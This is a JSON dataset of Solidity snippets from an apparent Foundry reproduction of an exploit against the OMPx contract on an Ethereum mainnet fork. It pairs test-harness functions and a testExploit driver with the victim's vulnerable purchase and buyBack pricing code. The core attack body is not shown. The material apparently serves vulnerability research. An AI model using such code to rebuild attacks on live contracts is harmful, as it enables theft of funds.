[
  {
    "contract/interface": "OMPxContract_exp",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "OMPxContract_exp",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "OMPxContract_exp",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "OMPxContract_exp",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "OMPxContract_exp",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "OMPxContract_exp",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        vm.createSelectFork(\"mainnet\", 20_468_780 - 1);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "OMPxContract_exp",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "OMPxContract_exp",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "OMPxContract_exp",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "OMPxContract_exp",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "OMPxContract_exp",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "OMPxContract_exp",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "OMPxContract_exp",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public {\n        vm.startPrank(attacker);\n\n        emit log_named_decimal_uint(\"[Start] Attacker ETH balance before exploit\", attacker.balance, 18);\n\n        AttackerC attackerC = new AttackerC();\n        attackerC.attack();\n\n        emit log_named_decimal_uint(\"[End] Attacker ETH balance after exploit\", attacker.balance, 18);\n\n        vm.stopPrank();\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "AttackerC",
    "source_type": "victim_contract",
    "function_name": "attack",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "AttackerC",
    "source_type": "victim_contract",
    "function_name": "receiveFlashLoan",
    "original_code": "    function receiveFlashLoan(\n        IERC20[] memory tokens,\n        uint256[] memory amounts,\n        uint256[] memory feeAmounts,\n        bytes memory userData\n    ) external;\n}\n",
    "description": ""
  },
  {
    "contract/interface": "IOMPxContract",
    "source_type": "victim_contract",
    "function_name": "buyBack",
    "original_code": "    function buyBack(uint256 tokensToBuyBack, uint256 minPrice) public {\n        uint currentPrice = getBuyBackPrice(0);\n        require(currentPrice >= minPrice);\n        uint256 totalPrice = tokensToBuyBack.mul(currentPrice).div(1e18);\n        require(tokensToBuyBack > 0);\n        require(tokensToBuyBack <= token.balanceOf(msg.sender));\n\n        token.safeTransferFrom(msg.sender, this, tokensToBuyBack);\n\n        emit BuyBack(msg.sender, tokensToBuyBack, totalPrice);\n        trackBuyBack(tokensToBuyBack, totalPrice);\n        // send out eth\n        msg.sender.transfer(totalPrice);\n    }\n\n    // spend available tokens\n",
    "description": ""
  },
  {
    "contract/interface": "IOMPxContract",
    "source_type": "victim_contract",
    "function_name": "purchase",
    "original_code": "    function purchase(uint256 tokensToPurchase, uint256 maxPrice) public payable returns(uint256 tokensBought_) {\n        require(tokensToPurchase > 0);\n        require(msg.value > 0);\n        return purchaseSafe(tokensToPurchase, maxPrice);\n    }\n\n    function purchaseSafe(uint256 tokensToPurchase, uint256 maxPrice) internal returns(uint256 tokensBought_){\n        require(maxPrice >= 0);\n\n        uint256 currentPrice = getPurchasePrice(msg.value, tokensToPurchase);\n        require(currentPrice <= maxPrice);\n\n        uint256 tokensWuiAvailableByCurrentPrice = msg.value.mul(1e18).div(currentPrice);\n        if(tokensWuiAvailableByCurrentPrice > tokensToPurchase) {\n            tokensWuiAvailableByCurrentPrice = tokensToPurchase;\n        }\n        uint256 totalDealPrice = currentPrice.mul(tokensWuiAvailableByCurrentPrice).div(1e18);\n        require(msg.value >= tokensToPurchase.mul(maxPrice).div(1e18));\n        require(msg.value >= totalDealPrice);\n\n        // 9% system support fee\n        feeBalance = feeBalance + totalDealPrice.div(9);\n\n        //mint tokens to sender\n        uint256 availableTokens = token.balanceOf(this);\n        if (availableTokens < tokensWuiAvailableByCurrentPrice) {\n            uint256 tokensToMint = tokensWuiAvailableByCurrentPrice.sub(availableTokens);\n            token.mint(this, tokensToMint);\n        }\n        token.safeTransfer(msg.sender, tokensWuiAvailableByCurrentPrice);\n\n        // money back\n        if (totalDealPrice < msg.value) {\n            //            uint256 tokensToRefund = tokensToPurchase.sub(tokensWuiAvailableByCurrentPrice);\n            uint256 oddEthers = msg.value.sub(totalDealPrice);\n            if (oddEthers > 0) {\n                require(oddEthers < msg.value);\n                emit TransferMoneyBack(msg.sender, oddEthers);\n                msg.sender.transfer(oddEthers);\n                trackOdd(oddEthers);\n            }\n        }\n        emit Purchase(msg.sender, tokensToPurchase, totalDealPrice);\n        trackPurchase(tokensWuiAvailableByCurrentPrice, totalDealPrice);\n        return tokensWuiAvailableByCurrentPrice;\n    }\n\n    // buyback tokens from user\n",
    "description": ""
  }
]